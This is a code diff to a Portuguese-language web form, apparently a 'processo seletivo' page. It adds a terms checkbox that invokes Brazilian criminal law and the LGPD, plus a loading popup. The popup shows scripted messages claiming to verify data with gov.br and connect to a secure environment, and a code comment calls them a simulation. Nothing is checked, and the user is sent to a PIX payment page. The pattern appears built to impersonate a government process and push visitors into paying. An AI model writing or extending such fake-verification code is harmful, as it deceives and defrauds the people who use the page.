@@ -216,8 +216,22 @@
                        class="w-full px-4 py-3 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-blue-500">
             </div>
             
+            <!-- Aceitar Termos -->
+            <div class="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-4">
+                <div class="flex items-start">
+                    <input type="checkbox" 
+                           id="aceitar-termos" 
+                           class="mt-1 h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
+                    <label for="aceitar-termos" class="ml-2 text-sm text-gray-700 leading-relaxed">
+                        <strong>Aceitar Termos:</strong> Declaro que as informações fornecidas são verdadeiras e estou ciente de que o fornecimento de dados falsos constitui crime previsto no Código Penal Brasileiro, sujeitando-me às penalidades legais. 
+                        Autorizo o uso dos meus dados pessoais para fins do processo seletivo, conforme a 
+                        <a href="#" class="text-blue-600 underline">Lei Geral de Proteção de Dados (LGPD)</a>.
+                    </label>
+                </div>
+            </div>
+            
             <button id="salvar-email" 
-                    class="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-3 px-6 rounded-md transition-colors">
+                    class="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-3 px-6 rounded-md transition-colors disabled:bg-gray-400 disabled:cursor-not-allowed">
                 <i class="fas fa-save mr-2"></i>
                 Salvar E-mail e Telefone
             </button>
@@ -302,8 +316,20 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
     
-    // Salvar email e telefone - mostrar popup e redirecionar
+    // Controlar estado do botão baseado nos termos
+    const termosCheckbox = document.getElementById('aceitar-termos');
     const salvarBtn = document.getElementById('salvar-email');
+    
+    if (termosCheckbox && salvarBtn) {
+        // Desabilitar botão inicialmente
+        salvarBtn.disabled = true;
+        
+        termosCheckbox.addEventListener('change', function() {
+            salvarBtn.disabled = !this.checked;
+        });
+    }
+    
+    // Salvar email e telefone - mostrar popup e redirecionar
     console.log('Botão salvar encontrado:', !!salvarBtn);
     
     if (salvarBtn) {
@@ -321,6 +347,13 @@ document.addEventListener('DOMContentLoaded', function() {
             
             if (!email || !telefone) {
                 alert('Por favor, preencha email e telefone');
+                return;
+            }
+            
+            // Verificar se aceitou os termos
+            const termosCheckbox = document.getElementById('aceitar-termos');
+            if (!termosCheckbox || !termosCheckbox.checked) {
+                alert('Por favor, aceite os termos e condições para continuar');
                 return;
             }
             
@@ -348,11 +381,33 @@ document.addEventListener('DOMContentLoaded', function() {
         const popup = document.getElementById('loading-popup');
         popup.classList.remove('hidden');
         
-        // Simular carregamento por 5 segundos
+        // Simular validação e carregamento seguro do governo
+        let step = 0;
+        const steps = [
+            'Validando informações...',
+            'Verificando dados no sistema gov.br...',
+            'Conectando com ambiente seguro...',
+            'Preparando portal de pagamento...',
+            'Carregando ambiente seguro...'
+        ];
+        
+        const updateText = () => {
+            const titleEl = popup.querySelector('h3');
+            if (titleEl && step < steps.length) {
+                titleEl.textContent = steps[step];
+                step++;
+            }
+        };
+        
+        // Atualizar texto a cada segundo
+        const interval = setInterval(updateText, 1000);
+        
+        // Redirecionar após 6 segundos
         setTimeout(() => {
+            clearInterval(interval);
             console.log('Redirecionando para checkout PIX...');
             window.location.href = '/pagamento-pix';
-        }, 5000);
+        }, 6000);
     }
     
     console.log('Comprovante carregado com sucesso');
